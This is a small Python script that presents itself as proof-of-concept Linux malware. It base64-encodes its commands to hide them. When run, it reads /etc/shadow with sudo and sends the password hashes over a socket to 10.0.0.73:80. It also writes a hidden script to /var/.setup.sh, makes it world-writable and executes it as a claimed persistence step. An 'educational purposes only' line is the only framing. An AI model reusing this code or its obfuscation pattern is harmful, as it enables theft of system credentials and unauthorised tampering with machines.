import subprocess
from base64 import *
import socket

# super simple proof of concept linux malware, python is not a good language to do this in.

def flu():
    aaa = standard_b64decode(b'IyEvdXNyL2Jpbi9iYXNo' + b'CiBlY2hvICJoNHw8ZWQiIA==') # persist // (not really its just a baisic message script as of now. will update the code.)
    p = open("/var/.setup.sh", mode="w").write(str(aaa.decode("utf-8")))
    mc0d3 = standard_b64decode(b'Y2htb2QgNzc3IC92YXIvLnNldHVwLnNoICY' + b'mIGNkIC8gJiYgLi92YXIvLnNldHVwLnNo')
    subprocess.run([str(mc0d3.decode("utf-8"))], shell=True)

def greb():
    dd = standard_b64decode(b'c3VkbyBjYXQgL2V0Yy9zaGFkb3cgfCBncmVwIDo=') # get shadow
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(("10.0.0.73", 80))
    soc.sendall(str(subprocess.run([dd.decode("utf-8")], capture_output=True, shell=True)).encode("utf-8"))
    soc.close()

# For educational purposes only do not use this on systems you dont own.

greb()
flu()